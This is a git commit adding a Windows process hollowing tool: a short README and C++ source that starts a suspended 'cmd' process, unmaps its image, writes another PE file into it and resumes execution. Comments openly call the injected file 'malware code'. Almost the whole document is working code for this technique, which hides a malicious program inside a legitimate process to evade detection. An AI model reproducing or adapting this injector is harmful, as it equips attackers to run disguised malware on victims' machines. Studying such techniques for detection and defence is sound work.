ff1116dfd3c634acab45e3635f70c642232aeacc
XD3an <deanhs0dean@gmail.com>
2023-06-03 03:52:49 -0400

    First init

---
+++ README.md
@@ -0,0 +1,8 @@
+# Process Hollowing
+
+- Environment: WIN64, X86
+
+- Change the PATH of target PE file
+    ```cpp
+    char *PATH = "PATH\\TO\\PE";
+    ```
---
+++ src/ProcessHollowing.cpp
@@ -0,0 +1,109 @@
+#include <stdio.h>
+#include <iostream>
+#include <Windows.h>
+
+typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+char *PATH = "target.exe";
+
+void RunPE(const char* path) {
+
+    /*
+        1. Create a suspended process
+    */
+    // Create a suspended process
+    STARTUPINFOA si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+    si.cb = sizeof(si);
+    BOOL bRet = CreateProcessA(NULL, (LPSTR)"cmd", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+
+    /*
+        2. Read malware code
+    */
+    // Read the PE file that will be injected
+    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    LPBYTE FileImage = new BYTE[dwFileSize];
+    DWORD FileReadSize;
+    ReadFile(hFile, FileImage, dwFileSize, &FileReadSize, NULL);
+    CloseHandle(hFile);
+
+    /*
+        3. Get the suspended process context and the environment information
+    */
+    // Get PE headers
+    PIMAGE_DOS_HEADER pDosHeaders = (PIMAGE_DOS_HEADER)FileImage;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(FileImage + pDosHeaders->e_lfanew);
+    // Get the image base of PE from PEB
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_FULL;
+    GetThreadContext(pi.hThread, &ctx);
+    PVOID RemoteImageBase = NULL;
+#ifdef _WIN64
+    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &RemoteImageBase, sizeof(PVOID), NULL);
+#endif
+#ifdef _X86_
+    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &RemoteImageBase, sizeof(PVOID), NULL);
+#endif
+
+    /*
+        4. Unload the suspended process memory
+    */
+    // Unload the memory space of the suspended process
+    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
+    if ((SIZE_T)RemoteImageBase == pNtHeaders->OptionalHeader.ImageBase)
+    {
+        NtUnmapViewOfSection(pi.hProcess, RemoteImageBase); // Unload existing files
+    }
+
+    /*
+        5. write malware code
+    */
+    // Allocate memory for the PE image and write the file header
+    PVOID RemoteProcessMemory = VirtualAllocEx(pi.hProcess, (PVOID)pNtHeaders->OptionalHeader.ImageBase, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, RemoteProcessMemory, FileImage, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+
+    // Write each section
+    PIMAGE_SECTION_HEADER pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
+    {
+        WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)RemoteProcessMemory + pSectionHeaders[i].VirtualAddress), (PVOID)(FileImage + pSectionHeaders[i].PointerToRawData), pSectionHeaders[i].SizeOfRawData, NULL);
+    }
+
+    /*
+        6. resume the suspended process
+    */
+    // Set the entry point address of the thread context
+    ctx.ContextFlags = CONTEXT_FULL;
+#ifdef _WIN64
+    ctx.Rcx = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
+    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+#endif
+#ifdef _X86_
+    ctx.Eax = (SIZE_T)((LPBYTE)RemoteProcessMemory + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
+    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &pNtHeaders->OptionalHeader.ImageBase, sizeof(PVOID), NULL);
+#endif
+
+    // Set thread context and resume thread
+    SetThreadContext(pi.hThread, &ctx);
+    ResumeThread(pi.hThread);
+
+    // Clean up
+    delete[] FileImage;
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+int main(int argc, wchar_t* argv[]) {
+    /*
+        Step
+            1. Create a suspended process
+            2. Read malware code
+            3. Get the suspended process context and the environment information
+            4. Unload the suspended process memory
+            5. write malware code
+            6. resume the suspended process
+    */
+    RunPE(PATH);
+    return 0;
+}
